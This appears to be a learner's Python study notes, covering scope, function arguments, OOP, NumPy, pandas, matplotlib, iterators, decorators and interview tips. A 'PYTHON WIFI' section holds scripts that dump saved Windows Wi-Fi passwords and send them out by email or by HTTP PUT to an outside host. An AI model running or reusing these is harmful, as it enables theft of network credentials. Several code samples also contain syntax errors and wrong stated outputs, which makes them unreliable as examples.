    print(sum)

f() #returns the default,0 

----------------------------------------------------
Variable Scope( Global scope and local scope)
----------------------------------------------------
#Global scope
#If a variable is in global scope, its called glocal varible and can be seen everywhere.

#Functions create local scope , whereas loops and if statements don't 

a =100   #global scope

def f1():
	print(a)

def f2():
	print(a)
	
f1()
f2()
	
100     # because a is global variable
100
--------------
def f1():
	a=100
	print(a)

def f2():
	print(a)
	
f1()
f2()

f2() returns error because variable a is local to function f1() only

------------------
a = 250

def f1():
	a = 100
	print(a)
	
def f2():
	a = 50
	print(a)

f1()
f2()
print(a)

100
50
250
---------------------
a = 250

def f1():
	b = a + 10    
	print(b)
	
def f2():
	a = 50      #local
	print(a)

f1()
f2()
print(a)

260
50
250
----------------------------
CHANGING THE GLOBAL VALUE
----------------------------
a = 250

def f1():
	global a    #you can't write global a = 100
	a = 100     #global
	print(a)
	
def f2():
	a = 50      #local
	print(a)

f1()
f2()
print(a)

100
50
100

-------------------
a = [1,2,3,4]

def f1():
	a = 10     # global
	print(a)
	
def f2():
	a = 50      # local
	print(a)

f1()
f2()
print(a)

10
50
[1,2,3,4]

--------------------
a = [1,2,3]

def f1():
	a[0] = 5     #global
	print(a)
	
def f2():
	a = 50      #local
	print(a)

f1()
f2()
print(a)

[5,2,3]
50
[5,2,3]  # the global value also change because we change the global value


---------------------------------------------------------------
KEYWORD ARGUMENTS & DEFAULT PARAMETERS
---------------------------------------------------------------

def about(name, age, likes):
	sentence = "Meet {}! They are {} years old and they like {}".format(name, age, likes)
	return sentence
	
about("Jack", 23 ,"Python")
#positional word argument

#argument "Jack" matches to parameter name
#argument 23 matches to parameter age
#argument "Python" matches to parameter likes

about(age = 23, name = "Jack", likes = Python")

#keyword arguments, each argument is associated with a keyword, which matches the marameter in the function definition
#keyword argument has more flexiblity

def about(name, age, likes = "Python"):
	sentence = "Meet {}! They are {} years old and they like {}".format(name, age, likes)
	return sentence
	
about("Jack",23)
Meet Jack! They are 23 years old and they like Python

about("Jack",23,"Football")
Meet Jack! They are 23 years old and they like Football

#default parameters must go to the end

def about(name = "Don", age = 23, likes = "Python"):
	sentence = "Meet {}! They are {} years old and they like {}".format(name, age, likes)
	return sentence
 
about()
Meet Don! They are 23 years old and they like Python

-------------------------------------------------------------------
PACKING AND UNPACKING USING ARGS AND KWARGS( * args and **kwargs)
-------------------------------------------------------------------
overview and review

print(1,2,3,4,5)    #passing 5 arguments to the print function
>>>  1 2 3 4 5

numbers = [1,2,3,4,5]
print(numbers)		#passing 1 argument to the print function
>>>  [1,2,3,4,5]

#unpacking the argument 
print(*numbers)
>>>  1 2 3 4 5

print("abc")
abc

print(*"abc")
a b c 

print("a","b","c")
a b c 

def add(x,y):
	return x + y 
	
add(10,10)
20

*args
def add(*numbers):  #pack in as many numbers as possible 
					#pack the args into one tuple
					#tuples are iterable, so we can iterate through them and add them
					#packing is useful when you do not know how many arguments you are expecting
					#making it flexible
						
	return

def add(*numbers):       # def add(*args):
	total = 0
	for number in numbers:
		total = total + number
	return(total)   
	
add(1,2,3,4,5,6,7,8,9)
45

#same as 
numbers = add(1,2,3,4,5,6,7,8,9)

def add(*args):
    sum = 0
    for i in range(len(args)):
        sum+=args[i]
    return sum

--------------------------------------------------------------
def about(name, age, likes):
	sentence = "Meet {}! They are {} years old and they like {}".format(name, age, likes)
	return sentence
	
dictionary = {"name":"Ziyad","age":23,"likes" = "Python"}
about(**dictionary)
Meet {}! They are {} years old and they like {}
#that unpacks all the keywrd arguments

about(name= "Ziyad", age = 23, likes = "Python")
Meet {}! They are {} years old and they like {} 


def foo(**kwargs):    #when we pack som arguments, we going to create a dictionary out of them
		for key, value in kwargs.items()       #set of tuple, each has a key and value			
			print("{}.{}".format(key, value)
			

foo(huda = "Female",ziyad = "male")
ziyad:male
huda:Female


def printAllVAriables(**kwargs):
    for x in kwargs:
        print("Variable Name is :",x," And Value is :", kwargs[x])

printAllVAriables(a=3,b = "b",d =7.0)
---------------------------------------------------------------
board = [" "] * 9

def print_board():
    row1 = "|{}|{}|{}|".format(board[0], board[1], board[2])
    row2 = "|{}|{}|{}|".format(board[3], board[4], board[5])
    row3 = "|{}|{}|{}|".format(board[6], board[7], board[8])

    print()
    print(row1)
    print(row2)
    print(row3)
    print()


def player_move(icon):

    if icon == "X":
        number = 1
    elif icon == "Y":
        number = 2
        
    print("Your turn player {}".format(number))
    
    choice = int(input("Enter your number(1-9): ").strip())
    if board[choice-1] == " ":
       board[choice-1] = icon
    else:
        print()
        print("That space is taken!")

def is_victory(icon):
    if (board[0] == icon and board[1] == icon and board[2] == icon) or\
       (board[3] == icon and board[4] == icon and board[5] == icon) or\
       (board[6] == icon and board[7] == icon and board[8] == icon) or\
       (board[0] == icon and board[3] == icon and board[6] == icon) or\
       (board[1] == icon and board[4] == icon and board[7] == icon) or\
       (board[2] == icon and board[5] == icon and board[8] == icon) or\
       (board[0] == icon and board[1] == icon and board[2] == icon) or\
       (board[0] == icon and board[1] == icon and board[2] == icon):
        return True
    else:
        return False

def is_draw():
    if " " not in board:
        return True
    else:
        return False

while True:
    print_board()
    player_move("X")
    print_board()
    if is_victory("X"):     #using a function as an boolean expression
        print("X Wins! Congratulations!")
        break
    elif is_draw():
        print("Its a draw!")
        break
    
    player_move("Y")
    if is_victory("Y"):
        print_board()
        print("Y Wins! Congratulations!")
        break
     elif is_draw():
        print("Its a draw!")
        break


----------------------------------------------------------------
MODULES 
----------------------------------------------------------------
a PYTHON file that contians functions,variables, classes that can be resuable in a different code


---module ----

def checkIfNotNumeric(*args):
    
    for x in args:
        if not(isinstance(x,(int,float))):
            return False
    return True

def addAllNumerics(*args):
    s = 0
    for x in args:
        s+=x
    return s


myName = "Python COurse"

---code----
import sys
sys.path.append('D:/mymodules/')
import myfuncs as f 

f.printMe('hellow')

c = myfs.addAllNumerics(2,3,4,6)

print(c)

------------------

def findMin(L,startIndx):
    """ Function to return minimum number and index """
    m = L[startIndx]
    idx = startIndx    
    for i in range(startIndx,len(L)):
        x = L[i]
        if x<m:
            m = x
            idx = i
        else:
            pass                
    return m,idx

def swapValues(L,idx1,idx2):
    """ Function to swap elements in list """
    L[idx2],L[idx1] = L[idx1], L[idx2]
    return L

#print(swapValues([1,2,3,4,5],1,3))

def checkIfNotNumeric2(L): 

    for x in L:
        if not(isinstance(x,(int,float))):
            return False
    return True

def sortList(L):
    if not(checkIfNotNumeric2(L)):
        print("Error: List does not contain numeric values")
        return
    else:
        c = 0
        for x in L:
            m,idx = findMin(L,c)
            L = swapValues(L,c,idx)
            c+=1
    return L


print(sortList([2,1,3,4,-5,-6]))

---------------------------------------------------------------------
OBJECT ORIENTED PROGRAMMING(O.O.P)
---------------------------------------------------------------------
#each template to make a coin in program is a CLASS

#Class -> Object

#Object is an instance of a class

#Object have states and actions(behaviors) they can do

#To create states, we use class variables 
#To create behaviors, we use methods 

# Methods are the same as functions, we call them methods when using classes

# Method is a function that belongs to an object

Class for a 10p Coin

States                             Methods

Value = 0.1							flip()
Color = "Silver
Number of edges = 1
Diameter = 24.5 (mm)
Thckness = 1.85 (mm)
Heads = True

#difference between objects and classes
#classes are the base template from which all objects are made from

#as object, they can have different behaviors

#objects behave independently from each other

--------------------------------------------------
#defining class
class Pound:

    #create states- value ,color,edges,diameter,thickness, heads
    value = 1.00
    colour = "gold"
    num_edges =1
    diameter = 22.5 #mm
    heads = True

#making an object(instance of class)
coin1 = Pound()

print(type(coin1))

print(coin1.value)

coin1.colour = "greenish"

print(coin1.colour)

#create new object
coin2 = Pound()
print(coin2.colour)
print()
print(coin1.colour)
------------------------------------------------
CLASS METHODS
------------------------------------------------
#Constructor in class
def __init__(self):    #self as parameter #used to refer to a specific instance of this class when we write the class code

Constructors are generally used for instantiating an object.
The task of constructors is to initialize(assign values) to the data members of the class when an object of class is created.
In Python the __init__() method is called the constructor and is always called when an object is created.

class GeekforGeeks: 
  
    # default constructor 
    def __init__(self): 
        self.geek = "GeekforGeeks"
  
    # a method for printing data members 
    def print_Geek(self): 
        print(self.geek) 
  
  
# creating object of the class 
obj = GeekforGeeks() 
  
# calling the instance method using the object obj 
obj.print_Geek()


-------------------------------------
import random

class Pound:

    def __init__(self, rare = False):

        self.rare = rare

        if self.rare == rare:
            self.value = 1.25
        else:
            self.value = 1.00
            
        self.color = "gold"
        self.num_edges = 1
        self.diameter = 22.5 #mm
        self.thickness = 3.15 #mm
        self.heads = True

    def rust(self):
        self.color = "greenish"

    def clean(self):
        self.color = "gold"

    def flip(self):
        head_options = [True,False]
        choice = random.choice(heads_optons)
        self.heads = choice

    #python destructor
    def __del__(self):
        print("Coins Spent!")
		
-------------------------------------------------------------
CLASS INHERITANCE AND POLYMORPHISM
------------------------------------------------------------
Inheritance allows us to define a class that inherits all the methods and properties from another class.

Parent class is the class being inherited from, also called base class.

Child class is the class that inherits from another class, also called derived class.
-----------------------------
Create a Parent Class
--------------------------------
Any class can be a parent class, so the syntax is the same as creating any other class:

Example
Create a class named Person, with firstname and lastname properties, and a printname method:

class Person:
  def __init__(self, fname, lname):
    self.firstname = fname
    self.lastname = lname

  def printname(self):
    print(self.firstname, self.lastname)

#Use the Person class to create an object, and then execute the printname method:

x = Person("John", "Doe")
x.printname()

----------------------------------
Create a Child Class
-----------------------------------
To create a class that inherits the functionality from another class, send the parent class as a parameter when creating the child class:

Example
Create a class named Student, which will inherit the properties and methods from the Person class:

class Student(Person):
  pass
 
---------------------------------
#polymorphism
#when a method has multiple forms inside a class, thats polymorphism


-------------------------------------------------------------------------------------------
NUMPY --> a Python library used for working with arrays OF same datatype(making it faster)
-------------------------------------------------------------------------------------------

import numpy as np 

a = np.array([1,2,3,4,5])  #array defined as list

b = np.array((1,2,3,4,5))  #array defined as tuple 

a = np.array([1,2,3,4,5], dtype = 'f')   # you can optionally defined data type (athough can dynaically find the data type)

a = np.array([[1,2,3],[4,5,6]])
print(a.ndim)                           #numpy dimension   # the length of array must be same
> 2                                     #2 because you need two index to point to an element in the two arrays

a[1,1]
> 4

arr = np.array([[1, 2, 3, 4], [5, 6, 7, 8]])
print(arr.shape)
>(2,4)                                   # the array has 2 dimensions, and each dimension has 4 elements. # no.of rows by no.of columns

arr = np.array([[[1,2,3,4],[4,5,6,4],[0,0,-1,4]],[[-1,-2,-3,4],[-4,-5,-6,4],[0,0,1,5]]])

print(C.shape)
> (2,3,4)                                # the array has 2 dimensions, 3 one darrays and each dimension has 3 elements.
 
print(arr.size)
>24                                      #2*3*4 = 24 ; total number of elements

np.arange                                #cretae a 1-d array
A = np.arange(20,30)
> [20 21 22 23 24 25 26 27 28 29]

A = np.random.permutation(np.arange(10))
> [8 9 1 3 2 5 0 6 7 4]

A = np.random.randint(20,40)
> 31                       #returns a random integer

type(A)
> int 

np.random.rand(1000)

D = np.arange(100).reshape(4,25)

D.shape
>(4,25)

np.zeros(10)
np.ones(10)

--------------------
NUmpy slicing
--------------------
creates a view rather than a copy 

result = np.where(arr == 45)            #to find the index of an element

print(result)                           #returns a tuple

print(result[0][0])                     #returns index

arr[result[0][0]] = 3                   # to change value

arr[1,2]         #access the elements in 2 row and 3 column 

arr[1,:]         #access the second row

arr[:,1]         #to access the second column

arr.T            #transpose matrix

arr[arr<40]      #returns elements less than 40

arr[(arr<40) & (arr>30)]    

arr2 = np.hstack(arr1,arr2)

np.vstack(arr1,arr2)

arr1.sort()

#To confirm SPEED BETWEEN universal , in-built and built FUNCTIONS

B = np.random.rand(1000000)
%timeit sum(B)
%timeit np.sum(B)  # B.sum()

307 ms ± 22.2 ms per loop (mean ± std. dev. of 7 runs, 1 loop each)
2.77 ms ± 260 µs per loop (mean ± std. dev. of 7 runs, 100 loops each)


def mySum(G):
    s = 0
    for x in G:
        s+=x
    return s

%timeit np.sum(B)
367 ms ± 22.2 ms

---------------------------------------------------------------------------
PANDAS
---------------------------------------------------------------------------

The Pandas module mainly works with the tabular data, whereas the NumPy module works with the numerical data. 
The Pandas provides some sets of powerful tools like DataFrame(more than 1 -dimen) and Series(1-dimensional arrays) that mainly used for analyzing the data, 
whereas in NumPy module offers a powerful object called Array.

import pandas as pd 

A = pd.Series([2,3,4,5],index=['a','b','c','d'])

type(A.values)

type(A)

A.index

A['a']

:
A['a':'c']

#PANDAS SERIES

grads_dict = {'A':4,'B':3.5,'C':3,'D':2.5}
grads = pd.Series(grads_dict)

print(grads.index)

print(grads.values)

marks_dict = {'A':85,'B':75,'C':65,'D':55}
marks = pd.Series(marks_dict)

print(marks)

print(marks['A'])

print(marks[0:2])

D = pd.DataFrame({'Marks':marks,'Grades':grads})

print(D.T)

D.columns 

D.values[2,0]

D['ScaledMarks']  = 100 * (D['Marks']/90)

print(D)

del D['ScaledMarks']

G = D[D['Marks']>70]

A = pd.DataFrame([{'a':1,'b':4},{'b':-3,'c':9}])     #missing values represented with zeros

print(A)

A.fillna(0)                    #to fill NaN with zeros

A = pd.Series(['a','b','c'],index=[1,3,5])

A.loc[1:3]

A.iloc[1:3]

D.iloc[2,:]

D.iloc[::-1,:]

# data[1] #explicit index, use loc instead 

# data[1:3] #implicit index, use iloc instead 

from sklearn.impute import SimpleImputer

df = pd.read_csv('E:/covid/covid_19_data.csv')

df.head(10)

df.drop(['SNo','Last Update'],axis=1,inplace=True)       #axis=1 means deal with columns , inplace means do the change in df itself

df.rename(columns={'ObservationDate':'Date','Province/State':'Province','Country/Region':'Country'},inplace=True)

df.head()

df['Date'] = pd.to_datetime(df['Date'])             #converting to internal pandas date format

imputer = SimpleImputer(strategy='constant')
df2 = pd.DataFrame(imputer.fit_transform(df),columns =df.columns)          #a simpler way to handle null in data

df.head()

df.describe()                                       #returns summary or statistic(min,max,std)

df.info()                                           #shows missing values

df = df.fillna('NA')                                #replaces empty value with 'NA'

df.info()


df2 = df.groupby('Country')[['Country','Confirmed','Deaths','Recovered']].sum().reset_index()    #grouping by Country

df2 = df.groupby(['Country','Date'])[['Country','Date','Confirmed','Deaths','Recovered']].sum().reset_index()

df3 = df2[df2['Confirmed']>100]

---------------------------------------------------------------------
Matplotlib
---------------------------------------------------------------------
import matplotlib.pyplot as plt

x = np.linspace(0,10,1000)
plt.plot(x,np.sin(x))

plt.scatter(x[::10],y[::10],color='red')

plt.plot(x,y,color='b')
plt.plot(x,np.cos(x),color='g')


import matplotlib.pyplot as plt
import pandas as pd
import numpy as np
from sklearn.impute import SimpleImputer

df = pd.read_csv('E:/covid/covid_19_data.csv')

df.head(50)

df.drop(['SNo','Last Update'],axis=1,inplace=True)
df.rename(columns={'ObservationDate':'Date','Province/State':'State','Country/Region':'Country'},inplace=True)

df['Date'] = pd.to_datetime(df['Date'])

imputer = SimpleImputer(strategy='constant')
df2 = pd.DataFrame(imputer.fit_transform(df),columns=df.columns)

df3 = df2.groupby(['Country','Date'])[['Country','Date','Confirmed','Deaths','Recovered']].sum().reset_index()

df3.head(10)

countries = df3['Country'].unique()
len(countries)

for idx in range(0,len(countries)):    
    C = df3[df3['Country']==countries[idx]].reset_index()        
    plt.scatter(np.arange(0,len(C)),C['Confirmed'],color='blue',label='Confirmed')
    plt.scatter(np.arange(0,len(C)),C['Recovered'],color='green',label='Recovered')
    plt.scatter(np.arange(0,len(C)),C['Deaths'],color='red',label='Deaths')
    plt.title(countries[idx])
    plt.xlabel('Days since the first suspect')
    plt.ylabel('Number of cases')
    plt.legend()
    plt.show()



df4 = df3.groupby(['Date'])[['Date','Confirmed','Deaths','Recovered']].sum().reset_index()

C = df4
plt.scatter(np.arange(0,len(C)),C['Confirmed'],color='blue',label='Confirmed')
plt.scatter(np.arange(0,len(C)),C['Recovered'],color='green',label='Recovered')
plt.scatter(np.arange(0,len(C)),C['Deaths'],color='red',label='Deaths')
plt.title('World')
plt.xlabel('Days since the first suspect')
plt.ylabel('Number of cases')
plt.legend()
plt.show()


-----------------------------------------------------------------------------
PYTHON WIFI
-----------------------------------------------------------------------------
# using Windows

# netsh wlan show profiles

# netsh wlan show profile calabash-5G key=clear                 #to get password; key content

# cat get_wifi_passwords.py
(https://github.com/davidbombal/red-python-scripts/tree/main)


import subprocess                        # Import subprocess so we can use system commands
import re

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

wifi_list = list()

if len(profile_names) != 0:
    for name in profile_names:
        
        wifi_profile = dict()        
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()        
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            
            wifi_profile["ssid"] = name           
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()            
            password = re.search("Key Content            : (.*)\r", profile_info_pass)            
            if password == None:
                wifi_profile["password"] = None
            else:                
                wifi_profile["password"] = password[1]
            
            wifi_list.append(wifi_profile) 

for x in range(len(wifi_list)):
    print(wifi_list[x]) 
    
    
# cat get_wifi_emails.py
import subprocess
import re
import smtplib
from email.message import EmailMessage

# Python allows us to run system commands by using a function provided by the subprocess module (subprocess.run(<list of command line arguments goes here>, <specify the second argument if you want to capture the output>))
# The script is a parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
# To save the contents that gets sent to the standard output stream (the terminal) we have to specify that we want to capture the output, so we specify the second argument as capture_output = True. This information gets stored in the stdout attribute. The information is stored in bytes and we need to decode it to Unicode before we use it as a String in Python.
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

# We imported the re module so that we can make use of regular expressions. We want to find all the Wifi names which is always listed after "ALL User Profile     :". In the regular expression we create a group of all characters until the return escape sequence (\r) appears.
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

# We create an empty list outside of the loop where dictionaries with all the wifi username and passwords will be saved.
wifi_list = list()


# If we didn't find profile names we didn't have any wifi connections, so we only run the part to check for the details of the wifi and whether we can get their passwords in this part.
if len(profile_names) != 0:
    for name in profile_names:
        # Every wifi connection will need its own dictionary which will be appended to the wifi_list
        wifi_profile = dict()
        # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password.
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        # We use a regular expression to only look for the absent cases so we can ignore them.
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            # Assign the ssid of the wifi profile to the dictionary
            wifi_profile["ssid"] = name
            # These cases aren't absent and we should run them "key=clear" command part to get the password
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            # Again run the regular expressions to capture the group after the : which is the password
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            # Check if we found a password in the regular expression. All wifi connections will not have passwords.
            if password == None:
                wifi_profile["password"] = None
            else:
                # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary.
                wifi_profile["password"] = password[1]
            # We append the wifi information to the wifi_list
            wifi_list.append(wifi_profile)

# Create the message for the email
email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"

# Create EmailMessage Object
email = EmailMessagessid
# Who is the email from
email["from"] = "name_of_sender"
# To which email you want to send the email
email["to"] = "email_address"
# Subject of the email
email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(email_message)

# Create smtp server
with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    # Connect securely to server
    smtp.starttls()
    # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
    smtp.login("login_name", "password")
    # Send email.
    smtp.send_message(email)
    
    
 # cat get_wifi_rest.py
 
 import subprocess
import re
import requests

# Python allows us to run system commands by using a function provided by the subprocess module (subprocess.run(<list of command line arguments goes here>, <specify the second argument if you want to capture the output>))
# The script is a parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
# To save the contents that gets sent to the standard output stream (the terminal) we have to specify that we want to capture the output, so we specify the second argument as capture_output = True. This information gets stored in the stdout attribute. The information is stored in bytes and we need to decode it to Unicode before we use it as a String in Python.
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

# We imported the re module so that we can make use of regular expressions. We want to find all the Wifi names which is always listed after "ALL User Profile     :". In the regular expression we create a group of all characters until the return escape sequence (\r) appears.
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

# We create an empty list outside of the loop where dictionaries with all the wifi ssid and passwords will be saved.
wifi_list = list()


# If we didn't find profile names we didn't have any wifi connections, so we only run the part to check for the details of the wifi and whether we can get their passwords in this part.
if len(profile_names) != 0:
    for name in profile_names:
        # Every wifi connection will need its own dictionary which will be appended to the wifi_list
        wifi_profile = dict()
        # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password.
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        # We use a regular expression to only look for the absent cases so we can ignore them.
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            # Assign the SSID of the wifi profile to the dictionary
            wifi_profile["ssid"] = name
            # These cases aren't absent and we should run them "key=clear" command part to get the password
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            # Again run the regular expressions to capture the group after the : which is the password
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            # Check if we found a password in the regular expression. All wifi connections will not have passwords.
            if password == None:
                wifi_profile["password"] = None
            else:
                # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary.
                wifi_profile["password"] = password[1]
            # We append the wifi information to the wifi_list
            wifi_list.append(wifi_profile)


# Write the contents of the wifi ssids and passwords to file
with open('wifi.txt', 'w+') as fh:
    for x in wifi_list:
        fh.write(f"SSID: {x['ssid']}\nPassword: {x['password']}\n")

# Open file with read-only in binary so you can send via API
with open('wifi.txt', 'rb') as fh:
    # Do put request with the data as the file
    r = requests.put("http://theboss.lol/", data=fh)
    # status code should be 200 if successful
    if r.status_code == 200:
        print('Success')

#Better Coding Ways
#1
num1 = 10_000_000_000
num2 = 10_000_000

total = num1+num2
print(f"{total :,}")

#2
#instead of manually closing the file, can use a CONTEXT MANAGERS

with open("test.txt", "r") as f:
	file_contents = f.read()
	
words = file_contents.split(" ")
word_count = len(words)
	
#3 iterating over a list
names = ["Yaw", "Kwame","Ama","Adwoa"]

for index, name in enumerate(names):
	print(index, name)
	
for index, name in enumerate(names, start=1):      #if you want index to start at 1
	print(index, name)
	
#4 working with multiple lists
names = ["Yaw", "Kwame","Ama","Adwoa","F"]
heroes = ["A","B","C","D", "E"]
universe = ["Marvel","DC","Marvel","DC"]

for index, name in enumerate(names):
    hero = heroes[index]
    print(f"{name} is actually {hero}")
print()

for name, hero in zip(names,heroes):
    print(f"{name} is actually {hero}")
    
#5 Unpacking values
#Normal
value = (1,2)
print(value)

#Unpacking
a, b = (1,2)
print(a)
>1

a, _ = (1,2)     #if you wont use the other value only , you can hide the other object with underscore
print(a)
> 1


a, b, *c = (1,2,3,4,5)     #* unpacks the remaining elements
print(c)
> [3,4,5]


#6 Class
class Person():
	pass
	
person = Person()

# person.first = "Corey"
# person.last = "Schafer"

#print(person.first)
#print(person.last)

person_info = {"first":"Corey","last":"Schafer"}

for key, value in person_info.items():
	setattr(person, key, value)

for key, _ in person_info.items():
	print(getattr(person, key))
	
#print(person.first)
#print(person.last)

# 7 Taking Password input
# normal
username = input("Username: ")
password = input("Password: ")

print("logging in...")

# secure way
from getpass import getpass

username = input("Username: ")
password = getpass("Password: ")

print("logging in...")


#8 Using modules
python -m venv vitrualenv           # to create virtual environment[At its core, the main purpose of Python virtual environments is to create an isolated environment for Python projects. This means that each project can have its own dependencies, regardless of what dependencies every other project has.]

#with virtual environments, you will need to install modules
$ pip install <module>              pip install requests

python -m json.tool                 # python -m instead of python bookstore.py because we do not have the script(running a module), will check the sys path and run it

python -m password                  #similar to python password.py

import smtpd 

help(smtpd)                        #used to display the documentation of modules, functions, classes, keywords etc.

dir(smtpd)                         #returns list of the attributes and methods of any object (say functions , modules, strings, lists, dictionaries etc.)

# Top Mistakes
1.Spaces and tabs. Need to Upgrade IDE and set tabs as spaces

2. Saving python file as main.py and importing math module raises an error when script is run
> Name of file should be changed

3. Import errors (definitely issue with path or file having same name as module we trying to call in file)

4. How to do mutable default arguments
#Wrong way
def add_employee(emp, emp_list=[]):
	emp_list.append(emp)
	print(emp_list)

emps = ["John","Jane"]

add_employee("Corey")
add_employee("John")
> ["Corey","John"]                       #returns both COrey and John instead of just John

#Right way
def add_employee(emp, emp_list=None):
	if emp_list is None:
		emp_list = []
	emp_list.append(emp)
	print(emp_list)

emps = ["John","Jane"]

add_employee("Corey")
add_employee("John")                    #returns only John

#
import time
from datetime import datetime

def display_time(time=datetime.now()):
	print(time.strftime("%B %d, %Y %H:%M:%S"))
	
display_time()
time.sleep(1)
display_time()

def display_time(time=None):
	time= datetime.now()
	print(time.strftime("%B %d, %Y %H:%M:%S"))
	
display_time()
time.sleep(1)
display_time()                # returns the correct output becuase of the way functions work

#6. Issues with Iterators like zip
names = ["Yaw", "Kwame","Ama","Adwoa","F"]
heroes = ["A","B","C","D", "E"]

identities = list(zip(names,heroes))           #list are not exhausted like other interables

print(identities)        # with Python 3, you would need function list

for identity in identities:
    print("{} is actually {}".format(identity[0], identity[1]))
    
#7. os module issues
import os
os.rename(filename)

from os import rename, remove                  #allow us to use multiple methods of the module
remove(filename)
remove()

from html import escape as h_escape
from glob import escape as g_escape

print(help(h_escape)


####ITERATORS AND ITERABLES
#A List is a iterable, but not an iterator. It doesnt have a state and a __next__() method
#Iterable is an object, which one can iterate over.
#Iterator is an object, which is used to iterate over an iterable object using __next__() method. Iterators have __next__() method, which returns the next item of the object. 
#Note that every iterator is also an iterable, but not every iterable is an iterator.

nums = [1,2,3]

for num in nums:
	print(num)

print(dir(nums))
> __iter__

i_nums = iter(nums)     #nums.__iter__().. calls the dunder function in the background

print(i_nums)
print(dir(i_nums))
>__next__

print(next(i_nums))
print(next(i_nums))
print(next(i_nums))

> 1
  2
  3
  
 class MyRange:
 	def __init__(self, start, end):
		self.value = start
		self.end = end
	
	def __iter__(self):
		return self
	
	def __next__(self):
		if self.value >= self.end:
			raise StopIteration
		current = self.value
		self.value += 1
		return current
		
#creating a generator function
def my_range(start,end):
	current = start
	while current < end:
		yield current
		current += 1
	
nums = MyRange(1,10)

print(next(nums))
print(next(nums))

###MODULES ITERTOOLS
import itertools

counter = itertools.count()

data = [100,200,300,400]

print(next(counter))
print(next(counter))

daily_data = list(zip(itertools.count(), data))

print(daily_data)
> [(0,100),(1,200),(2,300),(3,400)

counter = itertools.cycle(("On","Off"))
print(next(counter))
print(next(counter))
print(next(counter))
print(next(counter))

squares = map(pow, range(10), itertools.repeat(2))

print(list(squares))     #cast it to a list

#Context Manager
from contextlib import contextmanager

@contextmanager
def open_file(file, mode):
	f = open(file, mode)
	yield f
	f.close()
	
with open_file("sample.txt","w") as f:
	f.write("I tried, but i lost")
	
print(f.closed)

import os
from contextlib import contextmanager

cwd = os.getcwd()
os.chdir('Sample-Dir-One')
print(os.listdir())
os.chdir(cwd)

cwd = os.getcwd()
os.chdir('Sample-Dir-Two')
print(os.listdir())
os.chdir(cwd)

@contextmanager
def change-dir(destination):
	try:
		cwd = os.getcwd()
		os.chdir(destination)
		yield
	finally:
		os.chdir(cwd)

with change_dir('Sample-Dir-One'):
	print(os.listdir())

with change_dir('Sample-Dir-Two'):
	print(os.listdir())

###DECORATORS
# A decorator is a design pattern in Python that allows a user to add new functionality to an existing object without modifying its structure.
# Decorators are usually called before the definition of a function you want to decorate.

def outer_functions():
	message = "Hi"
	
	def inner_function():
		print(message)
	return inner_function()

outer_function()

def decorator_function(original_function):
	def wrapper_function():
		print("wrapper executed this before {}".format(original_function.__name__))
		return original_function()
	return wrapper_function

@decorator function
	def display():
		print("display function ran")

#display = decorator_function(display)

display()


##FIRST CLASS FUNCTIONS
#First-class functions means that the language treats functions as values – that you can assign a function into a variable, pass it around

def square(x):
	return x*x
	
def my_map(func, arg_list):
	result = []
	for i in arg_list:
		result.append(func(i))
	return result

squares = my_map(square, [1,2,3,4,5])

print(squares)

def cube(x)
	return x * x * x
f = square(5)

print(square)
print(f)

f = sqaure      #assign function as variable
print(f(5))

#####Preparing for Python Interview
#1. HOW TO WRITE CODE ON WHITEBOARD OR PAPER 
#how to use for loop to loop through range of numbers
for i in range(1,11):
	print(i)
	
#using while loop
i=1
while i <= 10:
	print(i)
	i += 1
#2.KNOW BASIC PYTHON CONTROL FLOW
a =10
b = 20
if a<b:
	print( "{} is less than {}".format(a,b))
elif a == 20 :
	print( "{} is equal to {}".format(a,b))
else:
	print( "{} is greater than {}".format(a,b))

#3. ABLE TO DISCUSS HOW YOU'VE USED PYTHON
- a web scraping project
- a program for system task, display system usage

import os, glob

os.chdir("/Users/HP.DESKTOP-MVC2C5I/Pictures")      #changing directory
for file in glob.glob("*.jpg"):                     #look through file system
	print(file)                                 #return file
	
#4. KNOW HOW TO SOLVE COMMON INTERIEW PROBLEMS
# fIZZ bUzz
for num in range(1,101):
	if num % 5 == 0 and num % 3 ==0:
		print("FizzBuzz")
	elif num % 3 == 0:
		print("Fizz")
	elif num % 5 == 0:
		print("Buzz")
	else:
		print(num)
		
#fibonacci Sequence
a, b = 0, 1

for i in range(0,10):
	print(a)
	a, b =b, a+b


[Pyhton Questions](https://bidsarmanish.blogspot.com/2017/10/python-interview-questions-2.html)

#10. KNOW THE BASICS OF OTHER TECHNOLOGIES 
#T-shaped profesional model is a metaphor used in job recruitment to describe the abilities of persons in the workforce. 
#The vertical bar on the letter T represents the DEPTH of related skills and expertise in a single field, 
#whereas the horizontal bar(BREADTH) is the ability to collaborate across disciplines with experts in other areas and to apply knowledge in areas of expertise other than one's own.

#



